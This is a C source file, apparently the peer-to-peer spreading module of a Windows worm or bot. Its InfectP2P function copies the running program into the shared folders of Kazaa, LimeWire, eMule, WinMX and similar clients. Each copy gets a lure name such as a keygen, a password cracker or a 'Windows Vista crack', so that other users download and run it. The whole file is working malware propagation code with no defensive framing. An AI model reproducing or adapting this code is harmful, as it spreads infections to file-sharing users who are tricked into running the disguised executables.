#include "Includes.h"

#ifndef NO_P2PSPREAD

char *szPath[] = 
{
	"C:\\program files\\kazaa\\my shared folder\\",
	"C:\\program files\\kazaa lite\\my shared folder\\",
	"C:\\program files\\kazaa lite k++\\my shared folder\\",
	"C:\\program files\\icq\\shared folder\\",
	"C:\\program files\\grokster\\my grokster\\",
	"C:\\program files\\bearshare\\shared\\",
	"C:\\program files\\edonkey2000\\incoming\\",
	"C:\\program files\\emule\\incoming\\",
	"C:\\program files\\morpheus\\my shared folder\\",
	"C:\\program files\\limewire\\shared\\",
	"C:\\program files\\tesla\\files\\",
	"C:\\program files\\winmx\\shared\\"
};

char *szFiles[] =
{
	"Windows 2003 Advanced Server KeyGen.exe",
	"UT 2003 KeyGen.exe",
	"Half-Life 2 Downloader.exe",
	"Password Cracker.exe",
	"FTP Cracker.exe",
	"Brutus FTP Cracker.exe",
	"Hotmail Hacker.exe",
	"Hotmail Cracker.exe",
	"Windows.Vista.32.bit.CRACK.by.RELOADED.exe",
	"Norton Anti-Virus 2008 Enterprise Crack.exe",
	"DCOM Exploit.exe",
	"NetBIOS Hacker.exe",
	"NetBIOS Cracker.exe",
	"Windows Password Cracker.exe",
	"L0pht 4.0 Windows Password Cracker.exe",
	"sdbot with NetBIOS Spread.exe",
	"Sub7 2.3 Private.exe",
	"Microsoft Visual C++ KeyGen.exe",
	"Microsoft Visual Basic KeyGen.exe",
	"Microsoft Visual Studio KeyGen.exe",
	"MSN Password Cracker.exe",
	"AOL Instant Messenger (AIM) Hacker.exe",
	"ICQ Hacker.exe",
	"AOL Password Cracker.exe",
	"Keylogger.exe",
	"Website Hacker.exe",
	"IP Nuker.exe",
	"Counter-Strike KeyGen.exe",
	"DivX 5.0 Pro KeyGen.exe"
};

bool InfectP2P()
{
	Peer2PeerInfo_s *pPeer2PeerInfo_s = new Peer2PeerInfo_s;

	if (pPeer2PeerInfo_s) 
		ZeroMemory(pPeer2PeerInfo_s, sizeof(Peer2PeerInfo_s));
	else
		ExitThread(0);

	GetModuleFileName(GetModuleHandle(NULL), pPeer2PeerInfo_s->szDirectory, sizeof(pPeer2PeerInfo_s->szDirectory));
	for (int i = 0; i < (sizeof(szPath) / sizeof(LPTSTR)); i++)
	{
		for (int j = 0; j < (sizeof(szFiles) / sizeof(LPTSTR)); j++)
		{
			strcpy(pPeer2PeerInfo_s->szFilePath, szPath[i]);
			strcat(pPeer2PeerInfo_s->szFilePath, szFiles[j]);
			if (CopyFile(pPeer2PeerInfo_s->szDirectory, pPeer2PeerInfo_s->szFilePath, false) != 0) 
			{ 
				SetFileAttributes(pPeer2PeerInfo_s->szFilePath, FILE_ATTRIBUTE_NORMAL);    
			} 
		}
	}
	delete pPeer2PeerInfo_s;
	return true;
}
#endif